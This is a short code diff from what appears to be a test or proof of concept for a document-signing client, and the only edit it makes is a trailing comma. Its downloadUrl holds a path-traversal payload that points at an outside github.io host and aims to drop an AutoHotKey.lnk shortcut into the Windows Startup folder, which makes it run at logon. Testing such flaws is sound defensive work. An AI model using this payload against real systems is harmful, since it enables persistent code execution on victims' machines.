@@ -39,7 +39,7 @@
           {
             data: "3333333333333%26ksbizNonce%3D38AFEC39CB79F1276EBE",
             url: "https://localhost/file-to-sign.pdf",
-            downloadUrl: "https://yistar0123.github.io/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/AutoHotKey.lnk/..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AutoHotKey.lnk"
+            downloadUrl: "https://yistar0123.github.io/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/AutoHotKey.lnk/..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AutoHotKey.lnk",
             uploadUrl: "https://localhost/",
             options: {
               addNonce: true,
